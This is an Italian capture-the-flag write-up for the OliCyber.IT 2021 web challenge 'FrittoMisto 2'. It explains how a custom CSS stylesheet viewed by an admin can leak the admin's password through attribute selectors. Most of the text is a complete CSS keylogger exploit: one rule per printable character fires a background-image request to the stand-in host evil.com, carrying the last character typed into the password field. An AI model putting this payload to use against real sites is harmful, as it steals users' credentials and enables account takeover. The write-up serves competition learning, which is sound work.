# OliCyber.IT 2021 - Competizione nazionale

## [web-02] FrittoMisto 2 (4 risoluzioni)

Una volta effettuato l'accesso è possibile creare uno stile css custom per il sito, che poi si può inviare all'admin in modo che lo visualizzi.

### Soluzione

L'admin apre il sito utilizzando il nostro stile custom, effettua l'accesso e naviga in giro per dare un'occhiata.

Si potrebbe pensare di provare a inserire del JS per fare una XSS, ma ogni tentativo dà scarsi risultati. Vediamo quindi cosa si può ottenere con solo CSS.

Di base sappiamo di avere la possibilità di effettuare richieste a tutti gli indirizzi che vogliamo. Se pensiamo a un

```css
body {
  background-image: url("http://evil.com/test");
}
```

quando il browser carica la pagina effettua una richiesta a `http://evil.com/test`.

Noi però vogliamo ottenere la password.

Una cosa interessante di CSS è che ci viene data la possibilità di selezionare un elemento in base al valore dei suoi attributi. Tra cui, per esempio, "value".

```css
input[value="test"] {
  background: red;
}
```

L'esempio qui sopra mette uno sfondo rosso a tutti gli input che come valore hanno la stringa `"test"`.

Ma non finisce qui! Ci sono modi per fare check come:

- `input[value~="test"]` seleziona tutti gli input col valore che **contiene la parola** `"test"`
- `input[value^="test"]` seleziona tutti gli input col valore che **inizia** con `"test"`
- `input[value$="test"]` seleziona tutti gli input col valore che **termina** con `"test"`
- `input[value*="test"]` seleziona tutti gli input col valore che **contiene** `"test"`

In questo modo è possibile realizzare un keylogger interamente in CSS.

### Exploit

Testando la lettera finale, possiamo ottenere la password inserita carattere per carattere:

```css
#password[value$=" "] {
  background-image: url("http://evil.com/?c=+");
}
#password[value$="!"] {
  background-image: url("http://evil.com/?c=%21");
}
#password[value$='"'] {
  background-image: url("http://evil.com/?c=%22");
}
#password[value$="#"] {
  background-image: url("http://evil.com/?c=%23");
}
#password[value$="$"] {
  background-image: url("http://evil.com/?c=%24");
}
#password[value$="%"] {
  background-image: url("http://evil.com/?c=%25");
}
#password[value$="&"] {
  background-image: url("http://evil.com/?c=%26");
}
#password[value$="'"] {
  background-image: url("http://evil.com/?c=%27");
}
#password[value$="("] {
  background-image: url("http://evil.com/?c=%28");
}
#password[value$=")"] {
  background-image: url("http://evil.com/?c=%29");
}
#password[value$="*"] {
  background-image: url("http://evil.com/?c=%2A");
}
#password[value$="+"] {
  background-image: url("http://evil.com/?c=%2B");
}
#password[value$=","] {
  background-image: url("http://evil.com/?c=%2C");
}
#password[value$="-"] {
  background-image: url("http://evil.com/?c=-");
}
#password[value$="."] {
  background-image: url("http://evil.com/?c=.");
}
#password[value$="/"] {
  background-image: url("http://evil.com/?c=%2F");
}
#password[value$="0"] {
  background-image: url("http://evil.com/?c=0");
}
#password[value$="1"] {
  background-image: url("http://evil.com/?c=1");
}
#password[value$="2"] {
  background-image: url("http://evil.com/?c=2");
}
#password[value$="3"] {
  background-image: url("http://evil.com/?c=3");
}
#password[value$="4"] {
  background-image: url("http://evil.com/?c=4");
}
#password[value$="5"] {
  background-image: url("http://evil.com/?c=5");
}
#password[value$="6"] {
  background-image: url("http://evil.com/?c=6");
}
#password[value$="7"] {
  background-image: url("http://evil.com/?c=7");
}
#password[value$="8"] {
  background-image: url("http://evil.com/?c=8");
}
#password[value$="9"] {
  background-image: url("http://evil.com/?c=9");
}
#password[value$=":"] {
  background-image: url("http://evil.com/?c=%3A");
}
#password[value$=";"] {
  background-image: url("http://evil.com/?c=%3B");
}
#password[value$="<"] {
  background-image: url("http://evil.com/?c=%3C");
}
#password[value$="="] {
  background-image: url("http://evil.com/?c=%3D");
}
#password[value$=">"] {
  background-image: url("http://evil.com/?c=%3E");
}
#password[value$="?"] {
  background-image: url("http://evil.com/?c=%3F");
}
#password[value$="@"] {
  background-image: url("http://evil.com/?c=%40");
}
#password[value$="A"] {
  background-image: url("http://evil.com/?c=A");
}
#password[value$="B"] {
  background-image: url("http://evil.com/?c=B");
}
#password[value$="C"] {
  background-image: url("http://evil.com/?c=C");
}
#password[value$="D"] {
  background-image: url("http://evil.com/?c=D");
}
#password[value$="E"] {
  background-image: url("http://evil.com/?c=E");
}
#password[value$="F"] {
  background-image: url("http://evil.com/?c=F");
}
#password[value$="G"] {
  background-image: url("http://evil.com/?c=G");
}
#password[value$="H"] {
  background-image: url("http://evil.com/?c=H");
}
#password[value$="I"] {
  background-image: url("http://evil.com/?c=I");
}
#password[value$="J"] {
  background-image: url("http://evil.com/?c=J");
}
#password[value$="K"] {
  background-image: url("http://evil.com/?c=K");
}
#password[value$="L"] {
  background-image: url("http://evil.com/?c=L");
}
#password[value$="M"] {
  background-image: url("http://evil.com/?c=M");
}
#password[value$="N"] {
  background-image: url("http://evil.com/?c=N");
}
#password[value$="O"] {
  background-image: url("http://evil.com/?c=O");
}
#password[value$="P"] {
  background-image: url("http://evil.com/?c=P");
}
#password[value$="Q"] {
  background-image: url("http://evil.com/?c=Q");
}
#password[value$="R"] {
  background-image: url("http://evil.com/?c=R");
}
#password[value$="S"] {
  background-image: url("http://evil.com/?c=S");
}
#password[value$="T"] {
  background-image: url("http://evil.com/?c=T");
}
#password[value$="U"] {
  background-image: url("http://evil.com/?c=U");
}
#password[value$="V"] {
  background-image: url("http://evil.com/?c=V");
}
#password[value$="W"] {
  background-image: url("http://evil.com/?c=W");
}
#password[value$="X"] {
  background-image: url("http://evil.com/?c=X");
}
#password[value$="Y"] {
  background-image: url("http://evil.com/?c=Y");
}
#password[value$="Z"] {
  background-image: url("http://evil.com/?c=Z");
}
#password[value$="["] {
  background-image: url("http://evil.com/?c=%5B");
}
#password[value$="\\"] {
  background-image: url("http://evil.com/?c=%5C");
}
#password[value$="]"] {
  background-image: url("http://evil.com/?c=%5D");
}
#password[value$="^"] {
  background-image: url("http://evil.com/?c=%5E");
}
#password[value$="_"] {
  background-image: url("http://evil.com/?c=_");
}
#password[value$="`"] {
  background-image: url("http://evil.com/?c=%60");
}
#password[value$="a"] {
  background-image: url("http://evil.com/?c=a");
}
#password[value$="b"] {
  background-image: url("http://evil.com/?c=b");
}
#password[value$="c"] {
  background-image: url("http://evil.com/?c=c");
}
#password[value$="d"] {
  background-image: url("http://evil.com/?c=d");
}
#password[value$="e"] {
  background-image: url("http://evil.com/?c=e");
}
#password[value$="f"] {
  background-image: url("http://evil.com/?c=f");
}
#password[value$="g"] {
  background-image: url("http://evil.com/?c=g");
}
#password[value$="h"] {
  background-image: url("http://evil.com/?c=h");
}
#password[value$="i"] {
  background-image: url("http://evil.com/?c=i");
}
#password[value$="j"] {
  background-image: url("http://evil.com/?c=j");
}
#password[value$="k"] {
  background-image: url("http://evil.com/?c=k");
}
#password[value$="l"] {
  background-image: url("http://evil.com/?c=l");
}
#password[value$="m"] {
  background-image: url("http://evil.com/?c=m");
}
#password[value$="n"] {
  background-image: url("http://evil.com/?c=n");
}
#password[value$="o"] {
  background-image: url("http://evil.com/?c=o");
}
#password[value$="p"] {
  background-image: url("http://evil.com/?c=p");
}
#password[value$="q"] {
  background-image: url("http://evil.com/?c=q");
}
#password[value$="r"] {
  background-image: url("http://evil.com/?c=r");
}
#password[value$="s"] {
  background-image: url("http://evil.com/?c=s");
}
#password[value$="t"] {
  background-image: url("http://evil.com/?c=t");
}
#password[value$="u"] {
  background-image: url("http://evil.com/?c=u");
}
#password[value$="v"] {
  background-image: url("http://evil.com/?c=v");
}
#password[value$="w"] {
  background-image: url("http://evil.com/?c=w");
}
#password[value$="x"] {
  background-image: url("http://evil.com/?c=x");
}
#password[value$="y"] {
  background-image: url("http://evil.com/?c=y");
}
#password[value$="z"] {
  background-image: url("http://evil.com/?c=z");
}
#password[value$="{"] {
  background-image: url("http://evil.com/?c=%7B");
}
#password[value$="|"] {
  background-image: url("http://evil.com/?c=%7C");
}
#password[value$=""] {
  background-image: url("http://evil.com/?c=%7F");
}
```
